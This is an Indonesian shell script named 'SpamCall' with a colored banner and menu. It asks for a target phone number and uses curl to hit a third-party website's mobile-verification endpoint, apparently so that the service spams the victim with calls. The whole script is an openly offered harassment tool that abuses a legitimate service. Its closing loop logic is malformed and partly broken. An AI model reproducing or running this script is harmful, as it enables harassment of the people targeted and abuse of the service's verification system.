#!/bin/sh

clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
figlet SpamCall
echo
sleep 1
echo 		$blue"<☆>================$green===============<☆>"
echo 		$red"	Pembuat  :  Bang Hadi		   "
echo 		$red"	Team	 :  GG Gimang		   "
echo 		$blue"<☆>=================$green==============<☆>"
echo
sleep 1
echo $cyan"<1>.  Spam Call"
echo $cyan"<2>.  Keluar"
echo
echo $blue"<☆>=================$green==============<☆>"
echo
echo
read -p "~>" dont


if [ $dont = 1 ]
then
echo
echo
read -p "Masukan No Target ~> " nomor;
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
fi

echo
echo
echo
read -p "Tekan y Untuk Lagi n untuk keluar~>" dont

if [ $dont = y ]
if [ $dont = n ]
then
sh h.sh
fi
exit
fi
